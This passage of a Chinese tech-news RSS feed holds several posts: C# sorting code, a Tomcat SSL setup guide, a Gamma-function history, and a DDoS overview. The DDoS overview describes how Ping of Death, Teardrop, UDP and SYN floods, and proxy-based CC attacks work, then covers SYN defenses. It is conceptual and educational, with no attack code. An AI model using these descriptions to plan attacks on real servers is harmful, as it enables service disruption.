&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/6f0da38f4094f7ae1c73be55c038c81d.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;原理：首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。&lt;/p&gt;
&lt;p&gt;算法过程如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;找到列表中的最小值，&lt;/li&gt;
&lt;li&gt;把它和第一个位置的元素交换，&lt;/li&gt;
&lt;li&gt;列表其余部分重复上面的步骤(从第二个位置开始，且每次加1).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;列表被有效地分为两个部分：从左到右的有序部分，和余下待排序部分。&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList SelectionSort(IList arrayToSort)
{
    int min;
    for (int i = 0; i &amp;lt; arrayToSort.Count; i++)
    {
        min = i;
        for (int j = i + 1; j &amp;lt; arrayToSort.Count; j++)
        {
            if (((IComparable)arrayToSort[j]).CompareTo(arrayToSort[min]) &amp;lt; 0)
            {
                min = j;
            }
        }
        object temp = arrayToSort[i];
        arrayToSort[i] = arrayToSort[min];
        arrayToSort[min] = temp;

        RedrawItem(i);
        RedrawItem(min);
        pnlSamples.Refresh();
        if (chkCreateAnimation.Checked)
            SavePicture();    
    }

    return arrayToSort;
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(1)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;希尔排序&lt;/h4&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/b308269cfc06bd5e19a1874669048731.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;希尔排序通过将比较的全部元素分为几个区域来提升插入排序的性能。这样可以让一个元素可以一次性地朝最终位置前进一大步。然后算法再取越来越小的步长进行排序，算法的最后一步就是普通的插入排序，但是到了这步，需排序的数据几乎是已排好的了（此时插入排序较快）。&lt;/p&gt;
&lt;p&gt;假设有一个很小的数据在一个已按升序排好序的数组的末端。如果用复杂度为O(&lt;i&gt;n&lt;/i&gt;&lt;sup&gt;2&lt;/sup&gt;)的排序（冒泡排序或插入排序），可能会进行&lt;i&gt;n&lt;/i&gt;次的比较和交换才能将该数据移至正确位置。而希尔排序会用较大的步长移动数据，所以小数据只需进行少数比较和交换即可到正确位置。&lt;/p&gt;
&lt;p&gt;一个更好理解的希尔排序实现：将数组列在一个表中并对列排序（用插入排序）。重复这过程，不过每次用更长的列来进行。最后整个表就只有一列了。将数组转换至表是为了更好地理解这算法，算法本身仅仅对原数组进行排序（通过增加索引的步长，例如是用&lt;code&gt;i += step_size&lt;/code&gt;而不是&lt;code&gt;i++&lt;/code&gt;）。&lt;/p&gt;
&lt;p&gt;例如，假设有这样一组数[ 13 14 94 33 82 25 59 94 65 23 45 27 73 25 39 10 ]，如果我们以步长为5开始进行排序，我们可以通过将这列表放在有5列的表中来更好地描述算法，这样他们就应该看起来是这样：&lt;/p&gt;
&lt;pre&gt;13 14 94 33 82
25 59 94 65 23
45 27 73 25 39
10&lt;/pre&gt;
&lt;p&gt;然后我们对每列进行排序：&lt;/p&gt;
&lt;pre&gt;10 14 73 25 23
13 27 94 33 39
25 59 94 65 82
45&lt;/pre&gt;
&lt;p&gt;将上述四行数字，依序接在一起时我们得到：[ 10 14 73 25 23 13 27 94 33 39 25 59 94 65 82 45 ].这时10已经移至正确位置了，然后再以3为步长进行排序：&lt;/p&gt;
&lt;pre&gt;10 14 73
25 23 13
27 94 33
39 25 59
94 65 82
45&lt;/pre&gt;
&lt;p&gt;排序之后变为：&lt;/p&gt;
&lt;pre&gt;10 14 13
25 23 33
27 25 59
39 65 73
45 94 82
94&lt;/pre&gt;
&lt;p&gt;最后以1步长进行排序（此时就是简单的插入排序了）。&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList ShellSort(IList arrayToSort)
{
    int i, j, increment;
    object temp;

    increment = arrayToSort.Count / 2;

    while (increment &amp;gt; 0)
    {
        for (i = 0; i &amp;lt; arrayToSort.Count; i++)
        {
            j = i;
            temp = arrayToSort[i];
            while ((j &amp;gt;= increment) &amp;amp;&amp;amp; 
                  (((IComparable)arrayToSort[j - increment]).CompareTo(temp) &amp;gt; 0))
            {
                arrayToSort[j] = arrayToSort[j - increment];
                RedrawItem(j);
                pnlSamples.Refresh();
                if (chkCreateAnimation.Checked)
                    SavePicture();
                j = j - increment;
            }
            arrayToSort[j] = temp;
            RedrawItem(j);
            pnlSamples.Refresh();
            if (chkCreateAnimation.Checked)
                SavePicture();
        }
        if (increment == 2)
            increment = 1;
        else
            increment = increment * 5 / 11;
    }

    return arrayToSort;
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;n&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n log&lt;sup&gt;2&lt;/sup&gt; n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(1)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;最后，感谢给与我帮助的人，有了你们的帮助，本文的质量有了更大的提高，谢谢！&lt;br&gt;
&lt;!--EndFragment--&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: left;&quot;&gt;&lt;!--EndFragment--&gt;&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Mon, 07 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-07-72850-f8e0d7124.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-07-72850-f8e0d7124.html</guid>
        
        
      </item>
    
      <item>
        <title>DDoS攻防战（一）：概述</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/c3d4416e87ddcc6d07e5c41df9163382.png&quot; rel=&quot;lightbox[72919]&quot; title=&quot;DDoS攻防战（一）：概述&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72920&quot; alt=&quot;031710143173700&quot; src=&quot;/images/jobbole.com/fbfedbe9ca9a56f4354d6bcd31f04035.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（此图摘自《Web脚本攻击与防御技术核心剖析》一书，作者：郝永清先生）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;DDoS,即 Distributed Denial of Service ,可译为分散式阻断服务攻击。&lt;/p&gt;
&lt;p&gt;上图与DDoS的字面已经清楚的表述出了此类攻击的原理，勿需多言。这类攻击泛滥存在的主要原因之一是网络服务的开放性，这一特点导致了DDoS攻击无法根本杜绝，目前主要应对策略是积极防御与消极防御。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;典型DDoS的攻击方式：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; ·死亡之Ping&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;icmp封装于IP报文之中，而IP对于很大的数据载荷采用分片传输的策略，而接收方需要对这些IP分片进行重组，如果接收方的重组算法不能很好地处理意外情况，后果会很严重，典型的意外情况包括：&lt;/p&gt;
&lt;p&gt;1.连续分片的偏移量之间不符合它们应该的逻辑关系，攻击者伪造出这样的一系列分包是很容易的；&lt;/p&gt;
&lt;p&gt;2.重组完成后的IP头与数据载荷，总长度竟超过了IP报文总长2^16字节（64kB）的限制，一个实现的例子是，前面各分片一律正常，唯有最后一个IP分片的数据载荷尽量填充到最大，如达到以太网最大传输单元MTU 1500字节上限，这样重组后的报文总长度就达到了约(64kB+1500B-20B-8B=65.44kB)的大小。&lt;/p&gt;
&lt;p&gt;这种攻击方式附加了对目标系统协议栈算法的漏洞利用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;·泪滴TearDrop&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;泪滴攻击指的是向目标机器发送损坏的IP包，诸如重叠的包或过大的包载荷。借由这些手段，该攻击可以通过TCP/IP协议栈中分片重组代码中的bug来瘫痪各种不同的操作系统。(此段摘自维基百科中文，实现方式可参考上死亡之Ping）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;·UDP洪水&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;UDP是一种无连接协议，当数据包通过 UDP 发送时，所有的数据包在发送和接收时不需要进行握手验证。当大量 UDP 数据包发送给受害系统时，可能会导致带宽饱和从而使得合法服务无法请求访问受害系统。遭受 DDoS UDP 洪泛攻击时，UDP 数据包的目的端口可能是随机或指定的端口，受害系统将尝试处理接收到的数据包以确定本地运行的服务。如果没有应用程序在目标端口运行，受害系统将对源IP发出 ICMP 数据包，表明“目标端口不可达”。某些情况下，攻击者会伪造源IP地址以隐藏自己，这样从受害系统返回的数据包不会直接回到僵尸主机，而是被发送到被伪造地址的主机。有时 UDP 洪泛攻击也可能影响受害系统周围的网络连接，这可能导致受害系统附近的正常系统遇到问题。然而，这取决于网络体系结构和线速。（此段摘自维基百科中文）&lt;strong&gt;　&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;·TCP RST 攻击&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;TCP协议存在安全漏洞，正常的TCP连接可以被非法的第三方复位，这是因为TCP连接通讯不包含认证的功能。如，在已知连接的五元组的情况下，攻击者可以伪造带有RST/SYN标志的TCP报文或普通数据报文，当其sequence number落在TCP连接的滑动窗口范围内，可能导致会话终止或者虚假数据插入。（这里仅仅提一下，详细可参考文章《&lt;a href=&quot;../72910/&quot; target=&quot;_blank&quot;&gt;从TCP协议的原理来谈谈RST复位攻击&lt;/a&gt;》、《&lt;a href=&quot;http://www.cnblogs.com/elong2009/archive/2009/12/20/1628139.html&quot;&gt;忆龙2009：TCP非法复位漏洞及解决方法&lt;/a&gt;》）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;·TCP 全连接攻击&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;庞大的攻击群同时地、不断地与目标服务器建立正常的TCP连接，从而严重影响正常用户的连接服务。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;·Syn Flood&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;攻击者向目标服务器发送大量（伪造源IP地址、伪造源端口、正确目标IP地址、正确目标端口）tcp syn数据包，目标服务器为了维持这么大量的虚假连接，大量的tcp状态机维持在了SYN_RCVD状态，严重地影响了处理速度与消耗了系统资源，而反观攻击者，伪造并发送这些小数据包，各项资源消耗都极低，对于网络传输速度为3Mb/s的一个攻击者来说，攻击包的速率大约可达每秒(3Mb/8/40=9830)个，如果网络传输速度达到30Mb/s，单个攻击者的攻击包速率可为98300/s，如果再考虑到分布式攻击，情况将变得极为恶劣。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/3336a91c3e3f3a1347d8ed8286268fda.png&quot; rel=&quot;lightbox[72919]&quot; title=&quot;DDoS攻防战（一）：概述&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72922&quot; alt=&quot;031841171772165&quot; src=&quot;/images/jobbole.com/6ef248b3de65ea3b81c7897d3642ff35.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;·CC攻击&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CC，即 Chanllenge Collapsar ,可直译为 黑洞挑战，CC攻击是 DDoS 攻击的一种类型，使用代理服务器向受害服务器发送大量貌似合法的请求，巧妙之处在于，网络上有许多免费代理服务器，甚至很多都支持匿名代理，所以其优点为：&lt;/p&gt;
&lt;p&gt;1.攻击者事先不需要抓取攻击傀儡，但仍需得到可用的、符合要求的代理 ip:port 列表;&lt;/p&gt;
&lt;p&gt;2.匿名代理，使得追踪变得非常困难，但并非不可能！&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;四层及以下的DDoS防御：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;新型攻击方式的产生、流行，必然导致对应防御策略的出现。&lt;/p&gt;
&lt;p&gt;而针对四层及四层以下的DDoS攻击，现在的硬件防火墙大多都能对死亡之Ping、icmp洪水、泪滴等做到很好的防御效果，所以，这里重点介绍SynFlood的若干防御策略：&lt;/p&gt;
&lt;p&gt;SynCookie：等到系统资源到达某一临界点，内核协议栈启用SynCookie机制，进行Syn包源IP:PORT验证，它本身是一种非常巧妙的实现，具体可参考文章《&lt;a href=&quot;http://blog.csdn.net/zhangskd/article/details/16986931&quot;&gt;SYN Cookie的原理和实现&lt;/a&gt;》；&lt;/p&gt;
&lt;p&gt;SynProxy：即Syn代理，一般可在前端防火墙上实现，不过，淘宝开源项目ipvs维护者吴佳明先生已经在内核层实现了这一功能，可理解为SynCookie+Proxy，请访问 https://github.com/alibaba/LVS/ 获得最新源码与项目文档；&lt;/p&gt;
&lt;p&gt;SynCheck:对Syn包依据一定的规则进行检验,以过滤掉一部分不规则的包；&lt;/p&gt;
&lt;p&gt;SynFirstDrop：Syn首包丢弃策略，但如果攻击者将伪造的Syn报文发送两次，这种方法就失去了效果。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/385003ee443597add80ad22453f61bfd.png&quot; rel=&quot;lightbox[72919]&quot; title=&quot;DDoS攻防战（一）：概述&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72923&quot; alt=&quot;040013165994836&quot; src=&quot;/images/jobbole.com/d7368d424c18861ef106ca696f389722.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;以上的这些常见防御方法都可以分别通过硬件和软件来实现，一般来讲，硬件防火墙处理能力要比软件方法强，但价格也更加昂贵，尽管软件实现性能会有下降，但也没有太差，例如，ipvs工作于内核层，淘宝在大部分网站使用其作为Director，下面是一些官方数据：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/f3a503aea27c1ea2b280234d0537c73a.png&quot; rel=&quot;lightbox[72919]&quot; title=&quot;DDoS攻防战（一）：概述&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-72924&quot; alt=&quot;040015450208526&quot; src=&quot;/images/jobbole.com/c7ecfba081de38c0624457f9c74f2e1e.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;如果在上面这些数据的基础之上，前端Director实现集群以分担系统负载，性能将会更佳，可见软件防火墙在使用的得当的情况之下，能极大降低系统成本，而且性能理想，这是经过淘宝的系统实际验证了的。&lt;/p&gt;
&lt;p&gt;在完成这篇文章的两个小时之前，笔者有幸通过网络的方式观看了淘宝_吴佳明先生的讲座，题目是《&lt;a href=&quot;http://www.osforce.cn/openclass/77/show&quot;&gt;LVS在大规模网络环境下的应用&lt;/a&gt;》，受益匪浅！在全国的公司中，淘宝在开源软件方面的贡献真的是首屈一指，实在令人敬佩！&lt;/p&gt;
&lt;p&gt;笔者将会在接下来的文章里讲述针对应用层的DDoS攻击的实现、防范，以及一个防火墙内核模块的实现。如有问题或者建议，欢迎留言讨论 &lt;strong&gt;:)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;附录：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参考资料：《Web脚本攻击与防御技术核心剖析》、《TCP-IP详解卷1：协议》、《LVS在淘宝环境中的应用》&lt;/p&gt;
&lt;p&gt;2004左右，Fr.Qaker先生公开了CC攻击的原理、实现代码、防范方法，结果却被恶意破坏者利用以进行大范围的互联网攻击，接着， Fr.Qaker便开源了自己开发的CC防火墙  :)&lt;/p&gt;
&lt;p&gt;这是Fr.Qaker当时一篇帖子《&lt;a href=&quot;http://forum.eviloctal.com/read-htm-tid-22777.html&quot;&gt;抗CC防火墙AntiAttackFireWall(AAFW)开源公告及源代码下载&lt;/a&gt;》&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Sun, 06 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-06-72919-3361701f8.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-06-72919-3361701f8.html</guid>
        
        
      </item>
    
      <item>
        <title>Tomcat中配置SSL证书</title>
        <description>

  &lt;h3 id=&quot;section&quot;&gt;背景&lt;/h3&gt;
&lt;p&gt;由于移动设备经常访问连接各种不可靠的无线网络，用户密码被嗅探的风险比较大，因此对与敏感信息需要加密传输。 而 HTTPS 是一种相对成熟的方案。&lt;/p&gt;

&lt;p&gt;使用 HTTPS 协议用于移动应用的数据传输，随着App数量越来越多而显得更强烈。&lt;/p&gt;

&lt;p&gt;startssl.com 提供一个免费的 ssl 证书，个人测试使用应该没问题。&lt;/p&gt;

&lt;h3 id=&quot;startssl-&quot;&gt;从 startssl 获取私钥和证书&lt;/h3&gt;
&lt;p&gt;首先在 &lt;code&gt;startssl.com&lt;/code&gt; 注册帐号，根据提示操作，这个过程比较漫长。注意填写个人信息时要详细（至少看起来是真实的地址）。 注册的攻略在网上能看到很多。 备份个人证书，否则以后换台电脑就不能登录做管理操作了。&lt;/p&gt;

&lt;p&gt;帐号 Ready 后，根据提示创建域名的证书，这个步骤可以得到两个文件，分别是以 &lt;code&gt;.key&lt;/code&gt; 结尾的私钥文件和以 &lt;code&gt;.crt&lt;/code&gt; 为结尾的证书文件。保存好这两个文件，并记住私钥文件的密码备用。&lt;/p&gt;

&lt;p&gt;还需要另外两个文件分别是 &lt;a href=&quot;http://www.startssl.com/certs/ca.pem&quot;&gt;ca.pem&lt;/a&gt; 和 &lt;a href=&quot;http://www.startssl.com/certs/sub.class1.server.ca.pem&quot;&gt;sub.class1.server.ca.pem&lt;/a&gt;。下载备用。&lt;/p&gt;

&lt;p&gt;注：以下以域名 api.example.com 为例，实际使用请换成你自己的域名。&lt;/p&gt;

&lt;p&gt;现在的4个文件分别为：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ssl.key&lt;/li&gt;
  &lt;li&gt;api.example.com.crt&lt;/li&gt;
  &lt;li&gt;ca.pem&lt;/li&gt;
  &lt;li&gt;sub.class1.server.ca.pem&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;tomcat--keystore-&quot;&gt;生成 tomcat 使用的 keystore 文件&lt;/h3&gt;

&lt;p&gt;Tomcat 支持两种模式的配置方式，分别是 &lt;code&gt;BIO&lt;/code&gt; 和 &lt;code&gt;NIO&lt;/code&gt; 使用 &lt;code&gt;JSSE&lt;/code&gt; 风格（使用 keystoreFile ）；&lt;code&gt;APR&lt;/code&gt;/&lt;code&gt;native&lt;/code&gt; 使用 &lt;code&gt;APR&lt;/code&gt; 风格（使用 SSLCertificateFile / SSLCertificateKeyFile 指定私钥和证书）。&lt;/p&gt;

&lt;p&gt;因为我们使用了 &lt;code&gt;NIO&lt;/code&gt; ，所以按照 &lt;code&gt;JSSE&lt;/code&gt; 风格配置，生成 keystore 文件。&lt;/p&gt;

&lt;p&gt;首先将 key 文件和 crt 文件合并导出为 &lt;code&gt;p12&lt;/code&gt; 。这个步骤需要输入私钥的密码，并指定一个新的导出密码。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;openssl pkcs12 -export -in ../api.example.com.crt -inkey ../ssl__.key \
    -out tomcat-startssl.p12 -name api.example.com -CApath ../
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后生成 keystore 文件，需要输入上一步的导出密码，及指定新的 keystore 密码，后面几步的导入需要用到这个密码。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;keytool -importkeystore -srckeystore tomcat-startssl.p12 -srcstoretype PKCS12 \
    -destkeystore startssl-api.example.com.jks
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;导入 startssl 的 CA&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;keytool -keystore startssl-api.example.com.jks -import -trustcacerts \
    -alias startcom.ca -file ../ca.pem
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;导入 startssl 的 sub1&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;keytool -keystore startssl-api.example.com.jks -import -trustcacerts \
    -alias startcom.ca.sub1 -file ../sub.class1.server.ca.pem
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;现在已经生成了一个可用的 &lt;code&gt;startssl-api.example.com.jks&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;tomcat&quot;&gt;配置 tomcat&lt;/h3&gt;

&lt;p&gt;在 tomcat 的server.xml中找到相关的 Connector 部分，这部分默认已被注释掉，去掉注释并调整内容如下&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;Connector SSLEnabled=&quot;true&quot; acceptCount=&quot;100&quot; clientAuth=&quot;false&quot;
    disableUploadTimeout=&quot;true&quot; enableLookups=&quot;false&quot; maxThreads=&quot;25&quot;
    port=&quot;8443&quot; keystoreFile=&quot;/etc/tomcat/startssl-api.example.com.jks&quot; keystorePass=&quot;passw0rd&quot;
    protocol=&quot;org.apache.coyote.http11.Http11NioProtocol&quot; scheme=&quot;https&quot;
    secure=&quot;true&quot; sslProtocol=&quot;TLS&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;重启 tomcat，访问 8443 端口试试。点击浏览器地址栏网址左侧的验证标志，可以检验证书的内容。&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;总结&lt;/h3&gt;

&lt;p&gt;通过简单的配置，将服务有 http 迁移到更安全的 https 服务。&lt;/p&gt;

&lt;p&gt;补充1： 本文的方法因为偷懒直接使用了 startssl 来为我们管理私钥文件，从安全的角度，大部分情况下我们应该自己保管这个文件。&lt;/p&gt;

&lt;p&gt;补充2： 现在部署 HTTPS 更好的方式是用 Nginx 做 &lt;code&gt;SSL offloading&lt;/code&gt; ，而实际的业务服务器仍然使用 HTTP 提供服务。&lt;/p&gt;

&lt;p&gt;补充3： startssl 个人使用没问题，如果是企业使用，建议购买有商业支持的证书。&lt;/p&gt;

&lt;h4 id=&quot;section-2&quot;&gt;参考文档&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;http://tomcat.apache.org/tomcat-7.0-doc/ssl-howto.html&lt;/li&gt;
&lt;/ul&gt;

  

</description>
        <pubDate>Sat, 05 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-05-2014-07-05-startssl-in-tomcat.html-163c9be4f.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-05-2014-07-05-startssl-in-tomcat.html-163c9be4f.html</guid>
        
        
      </item>
    
      <item>
        <title>[火光摇曳]神奇的伽玛函数(下)</title>
        <description>

						&lt;p&gt;原文链接： &lt;a href=&quot;http://www.flickering.cn/?p=203&quot;&gt;http://www.flickering.cn/?p=203&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;五、$ \Gamma(n) = (n-1)!$ 还是 $ \Gamma(n) = n! $ ? &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;伽玛函数找到了，我们来看看第二个问题，为何伽玛函数被定义为满足 $\Gamma(n)=(n-1)!$？ 这看起来挺别扭的，如果我们稍微修正一下，把伽玛函数定义中的 $t^{x-1}$ 替换为 $t^x$&lt;br&gt;
$$ \Gamma(x) = \int_0^{\infty} t^{x}e^{-t}dt , $$&lt;br&gt;
这不就可以使得 $\Gamma(n)=n!$了嘛。估计数学界每年都有学生问这个问题，然而答案却一直有一些争议。&lt;/p&gt;
&lt;p&gt;欧拉最早的伽玛函数定义还真是如上所示，选择了$\Gamma(n)=n!$，事实上数学王子高斯在研究伽玛函数的时候， 一直使用的是如下定义：&lt;br&gt;
$$ \Pi(x)=\int_{0}^\infty t^x e^{-t}\,dt ,$$&lt;br&gt;
然而这个定义在历史上并没有流传开来。&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;size-full wp-image-176 aligncenter&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/Legendre.jpg&quot; alt=&quot;Legendre&quot; width=&quot;160&quot; height=&quot;200&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;勒让德肖像水彩画&lt;/p&gt;
&lt;p&gt;欧拉在伽玛函数的推导中实际上引入了两类积分形式&lt;br&gt;
$$ \int_0^1 t^{x}(1-t)^{y}dt, \quad \quad \int_0^{\infty} t^{x}e^{-t}dt $$&lt;br&gt;
现在我们分别称为欧拉一类积分和欧拉二类积分。勒让德追随欧拉的脚步，发表了多篇论文对欧拉积分进行了深入的研究和推广，不过在勒让德的研究中，对积分中的参数做了 $-1$的移位修改，主要定义为&lt;br&gt;
$$ B(x, y) = \int_0^1 t^{x-1}(1-t)^{y-1}dt $$&lt;br&gt;
和&lt;br&gt;
$$ \Gamma(x) = \int_0^{\infty} t^{x-1}e^{-t}dt .$$&lt;br&gt;
$B(x,y)$ 现在称为贝塔积分或者贝塔函数。其中$\Gamma(x)$ 的这个定义选择导致了 $ \Gamma(n) = (n-1)!$ 。实际上伽马函数中的$\Gamma$符号历史上就是勒让德首次引入的，而勒让德给出的这个伽玛函数的定义在历史上起了决定作用，该定义被法国的数学家广泛采纳并在世界范围推广，最终使得这个定义在现代数学中成为了既成事实。&lt;br&gt;
&lt;span id=&quot;more-6656&quot;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;什么原因驱使勒让德偏向选择$\Gamma(n) = (n-1)!$ 的定义呢？ 这成为了一个谜，没有明确的解释。 不过有数学史研究者们对欧拉的研究表明，在$1730\sim1768$ 年之间欧拉自己在研究一类积分的时候，实际上就已经对积分中的参数做了$-1$的移位修改，从而明确的引入了贝塔积分，而这个修改显然被勒让德注意到了。 是什么原因使得欧拉和勒让德在研究他们的积分形式的时候都考虑引入$-1$ 移位修改呢？ 有数学家猜测一个可能的原因是这两位数学家注意到，如果按照现代伽玛函数的定义，那么有&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{beta-gamma-decompose}&lt;br&gt;
B(x,y) = \frac{\Gamma(x)\Gamma(y)}{\Gamma(x+y)} ,&lt;br&gt;
\end{equation}&lt;br&gt;
$B(x,y)$ 具有非常漂亮的对称形式。可是如果选取高斯给出的 $\Pi(n)=n!$ 的定义，令&lt;br&gt;
$$ E(x, y) = \int_0^1 t^{x}(1-t)^{y}dt $$&lt;br&gt;
则有&lt;br&gt;
$$ E(x,y) = \frac{\Pi(x)\Pi(y)}{\Pi(x+y+1)} ,$$&lt;br&gt;
这个形式显然不如 $B(x,y)$ 具有对称美，而数学家总是很在乎数学公式的美感的。&lt;/p&gt;
&lt;p&gt;还有一个类似的解释是从抽象代数的角度提出的，考虑伽玛分布的概率密度函数&lt;br&gt;
$$ f_\alpha(x)= \left\{&lt;br&gt;
\begin{aligned}&lt;br&gt;
